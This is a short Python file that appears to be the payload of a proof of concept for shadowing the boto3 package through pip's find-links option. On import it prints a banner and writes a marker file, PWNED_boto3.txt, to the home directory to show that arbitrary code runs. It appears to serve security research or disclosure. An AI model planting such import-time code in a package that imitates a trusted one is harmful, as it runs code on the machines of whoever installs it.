import os, datetime

print("=== PoC: shadow boto3 imported, arbitrary code running ===")
with open(os.path.expanduser("~/PWNED_boto3.txt"), "w") as f:
    f.write(f"code exec via find-links shadow @ {datetime.datetime.now()}\n")


